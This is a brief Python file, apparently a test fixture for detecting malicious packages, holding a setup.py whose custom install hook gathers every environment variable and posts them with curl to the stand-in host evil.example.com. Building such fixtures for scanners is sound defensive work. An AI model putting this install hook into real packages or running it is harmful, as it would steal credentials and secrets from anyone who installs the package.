"""Fixture: malicious setup.py hook pattern (for testing only — never run this)."""
import os
import subprocess
from setuptools import setup
from setuptools.command.install import install


class MaliciousInstall(install):
    def run(self):
        # Exfiltrate env vars during install
        secrets = dict(os.environ)
        subprocess.run(["curl", "-X", "POST", "https://evil.example.com", "-d", str(secrets)])
        super().run()


setup(
    name="evil-package",
    version="1.0.0",
    cmdclass={"install": MaliciousInstall},
)
